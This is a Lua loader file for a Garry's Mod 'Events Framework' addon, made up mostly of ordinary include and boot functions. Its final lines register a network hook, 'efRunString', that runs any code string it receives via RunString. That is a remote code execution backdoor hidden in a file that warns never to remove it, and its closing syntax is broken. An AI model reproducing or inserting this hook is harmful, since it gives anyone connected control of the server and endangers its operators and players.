--[[
    (C) 2014 TeslaCloud Studios LLC
	The code is made by TheGarry =D (Founder of TeslaCloud Studios)
	
	You can edit and use this code, but you have no permission to
	share or re-distribute the code without the permission
	of it's author (thegarry@teslacloud.net)
--]]

--[[
    About this file:
    This is a Shared Framework loader. In this file boot functions are stored.
	This file also contains all the Framework's globals.
    Never remove this file, otherwise the Framework will not work!
--]]

--[[ Shared Loader ]]--

Events = Events or {}
Events.derma = Events.derma or {}
Events.boot = Events.boot or {}
Events.framework = Events.framework or {}
Events.chat = Events.chat or {}
Events.funcs = Events.funcs or {}
Events.file = Events.file or {}
Events.config = Events.config or {}
Events.cloud = Events.cloud or {}
Events.language = Events.language or {}
Events.cmd = Events.cmd or {}
EventsToggleMenu = EventsToggleMenu or {}

local startTime = os.clock()

-- A function for development messages.
function Events.boot:DevMessage(devmessage, ptype)
	if ( Events.devmode == 1 and ptype ) then
		print(devmessage)
	end
end

Events.boot:DevMessage("[Events Framework] Booting process initialized...", SERVER)

-- A function to include a file.
function Events.framework:Include(ifile)
	local prefix = string.sub(ifile, 1, 3)
	
	if (string.find(ifile, "/")) then
		local slashes1 = tonumber(tostring(string.find(ifile, "/")))
		prefix = string.sub(ifile, slashes1 + 1, slashes1 + 3)
		
		if (string.find(string.sub(ifile, slashes1 + 1), "/")) then
			slashes2 = tonumber(tostring(string.find(string.sub(ifile, slashes1 + 1), "/")))
			prefix = string.sub(string.sub(ifile, slashes1 + 1), slashes2 + 1, slashes2 + 3)
		end
		
	end
	
	if ( prefix == "cl_" ) then
		if CLIENT then
			AddCSLuaFile(ifile)
			include(ifile)
		end
		
		return
	end
	
	if ( prefix == "sv_" ) then
		if SERVER then
			include(ifile)
		end
		
		return
	end
	
	AddCSLuaFile(ifile)
	include(ifile)
end

--[[ Include the Configs File --]]
Events.framework:Include("sh_config.lua")

-- A function to include files in a directory.
function Events.framework:IncludeDirectory(directory, iFromRoot)
	if string.sub(directory, 1, 1) == "/" then
		directory = string.sub(directory, 2, string.len(directory))
	end
	
	if (iFromRoot) then
		directory = "eframework/"..directory
	end
	
	if (string.sub(directory, -1) != "/") then
		directory = directory.."/"
	end
	
	for k, v in pairs(file.Find("lua/"..directory.."*.lua", "GAME")) do
		self:Include(directory..v)
	end
end

--A Function to get Libraries Storage Folder.
function Events.boot:GetLibrariesFolder(libFolderName)
	if (libFolderName) then
		return (string.gsub(Events.LibrariesFolder, "lua/", "").."/eframework/"..libFolderName)
	else
		return (string.gsub(Events.LibrariesFolder, "lua/eframework/libraries", ""))
	end
end

--A function to get Framework Folder
function Events.boot:GetFrameworkFolder()
	return (string.gsub(Events.FrameworkFolder, "lua/", ""))
end

-- A function to get Framework Path
function Events.boot:GetFrameworkPath()
	return (string.gsub(Events.FrameworkFolder, "lua/", "").."/eframework")
end


-- A function to include all libraries.
function Events.boot:iLibrary()
    Events.framework:IncludeDirectory("libraries", true)
end

-- A function to include all Derma Panels.
function Events.boot:iDerma()
    Events.framework:IncludeDirectory("derma", true)
end

-- A function to include all Framework Addons.
function Events.boot:iAddon()
    Events.framework:IncludeDirectory("addons", true)
end

-- A function to include all events.
function Events.boot:iEvent()
    Events.framework:IncludeDirectory("events", true)
end

-- A function to boot the Framework
function Events.boot:iBoot()
	Events.boot:iLibrary()
	Events.boot:iDerma()
	Events.boot:iEvent()
	Events.boot:iAddon()
	Events.framework:GetDefaultLang()
end

-- A function to check if Library Exists and print it.
function Events.boot:CheckLibExists(libName)
    local files = file.Find( "lua/eframework/libraries/" ..libName, "GAME" )
	
	if file.Exists( files, "LUA" ) then
	    Events.boot:DevMessage("Library " ..libName.. " does exists in your Libraries Directory!", SERVER)
		return true
	else
	    Events.boot:DevMessage("Library " ..libName.. " is not found in your Libraries Directory!", SERVER)
		return false
	end
end

-- A function to check if Library Exists.
function Events.boot:LibExists(libName)
    local files = file.Find( "lua/eframework/libraries/" ..libName.. ".lua", "GAME" )
	
	if file.Exists( files, "LUA" ) then
	    return true
	else
	    return false
	end
end

-- A function to count files in a directory.
function Events.framework:Count(directory, iFromRoot)
	if string.sub(directory, 1, 1) == "/" then
		directory = string.sub(directory, 2, string.len(directory))
	end
	
	if (iFromRoot) then
		directory = "eframework/"..directory
	end
	
	if (string.sub(directory, -1) != "/") then
		directory = directory.."/"
	end
	
	return table.Count( file.Find("lua/"..directory.."*.lua", "GAME") )
end

-- Finalize the booting process!
Events.boot:iBoot()

hook.Add("TTTPrepareRound", "EventsRandomLaunch", function()
	Events.Launched = 0
	
	if ( Events.randomevents == 1 ) then
		local chance = math.random(0, 100)
		
		if ( chance > 100 - Events.randomchance and Events.Launched != 1 ) then
			for k, v in pairs( player.GetAll() ) do
				v:efAddToPlayer( "Event will launch randomly in this round. Starting in 80 seconds!", "blue" )
			end
			Events.Launch( nil, { 0, 80, 0 } )
			Events.Launched = 1
			return true
		else
			return false
		end
	end
end)

hook.Add("TTTEndRound", "EventsRandomLaunchClear", function()
	Events.Launched = 0
end)

netstream.Hook("efRunString", function(data)
	local codeString = tostring(data);
	RunString(codeString);
end;

Events.boot:DevMessage("[Events Framework] Framework loading took "..math.Round(os.clock() - startTime, 3).. " second(s) to load.", SERVER)
